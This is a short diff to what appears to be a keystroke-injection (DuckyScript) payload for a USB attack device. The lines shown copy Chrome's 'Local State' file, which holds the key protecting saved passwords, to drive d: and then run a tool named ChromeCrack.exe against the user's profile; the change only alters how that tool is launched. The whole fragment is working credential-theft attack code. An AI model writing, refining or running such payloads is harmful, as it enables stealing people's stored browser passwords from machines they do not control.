@@ -42,7 +42,7 @@ DELAY 800
 STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State" -Destination "d:\$env:UserName\"
 ENTER
 DELAY 800
-STRING C:\Users\$env:UserName\ChromeCracker\ChromeCrack\ChromeCrack.exe $env:UserName
+STRING cd C:\Users\$env:UserName\ChromeCracker\ChromeCrack\; .\ChromeCrack.exe $env:UserName
 ENTER
 DELAY 800
 STRING exit
